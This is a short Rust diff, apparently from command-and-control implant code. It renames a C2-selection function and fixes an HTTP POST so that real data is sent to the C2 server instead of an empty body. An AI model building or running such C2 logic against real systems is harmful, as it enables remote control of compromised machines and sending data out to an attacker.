@@ -24,7 +24,7 @@ pub fn get_commands(c2s: Vec<Addr>, docname: Docname) {
         error!("no c2 server specified")
     }
 
-    if let Ok(c2) = find_valid_c2(c2s) {
+    if let Ok(c2) = get_valid_c2(c2s) {
         download_doc(&c2, &docname);
     }
 }
@@ -81,7 +81,7 @@ fn try_file_write(docname: &String, body: &str) -> Result<(), ()> {
 fn blocking_post(addr: &Addr, body: String) -> Result<(), ()> {
     info!("blocking get to {addr}");
     let client = reqwest::blocking::Client::new();
-    match client.post(addr).body("").send() {
+    match client.post(addr).body(body).send() {
         Ok(resp) => Ok(info!("response from {addr}: {resp:?}")),
         Err(e) => Err(error!("{e}")),
     }
